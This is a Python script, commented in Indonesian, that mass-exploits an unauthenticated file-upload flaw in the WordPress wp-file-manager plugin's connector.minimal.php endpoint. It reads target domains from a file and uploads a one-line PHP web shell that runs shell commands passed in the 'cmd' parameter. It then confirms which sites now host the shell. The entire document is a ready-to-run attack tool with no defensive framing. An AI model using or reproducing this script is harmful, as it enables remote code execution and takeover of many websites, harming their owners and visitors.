import requests
import sys

def upload_shell(target_url, shell_filename, webshell_content):
    # Endpoint File Manager Plugin yang rentan
    url = f"{target_url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    
    # Data form multipart untuk file upload
    files = {
        'upload[]': (shell_filename, webshell_content, 'application/x-php')
    }
    
    data = {
        'cmd': 'upload',
        'target': 'l1_Lw'  # Target direktori root pada File Manager
    }
    
    try:
        # Mengirimkan request POST
        response = requests.post(url, files=files, data=data, verify=False, timeout=10)
        
        # Cek apakah upload berhasil (cek file langsung)
        check_shell_url = f"{target_url}/wp-content/plugins/wp-file-manager/lib/files/{shell_filename}"
        check_response = requests.get(check_shell_url, verify=False, timeout=10)
        
        if check_response.status_code == 200:
            print(f"[+] Berhasil: {check_shell_url}")
        else:
            print(f"[-] Gagal: {target_url}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Kesalahan ({target_url}): {e}")

# Mengecek parameter baris perintah
if len(sys.argv) != 3:
    print("Penggunaan: python mass_upload_filemanager.py <file_domain> <shell_filename>")
    sys.exit(1)

# Menangkap parameter dari baris perintah
file_domain = sys.argv[1]
shell_filename = sys.argv[2]

# Isi file webshell yang akan diunggah
webshell_content = "<?php echo shell_exec($_GET['cmd']); ?>"

# Membaca daftar domain dari file
try:
    with open(file_domain, 'r') as f:
        domains = f.read().splitlines()
except FileNotFoundError:
    print(f"[!] File {file_domain} tidak ditemukan.")
    sys.exit(1)

# Memulai proses upload massal
for domain in domains:
    print(f"[~] Mengunggah ke: {domain}")
    upload_shell(domain.strip(), shell_filename, webshell_content)
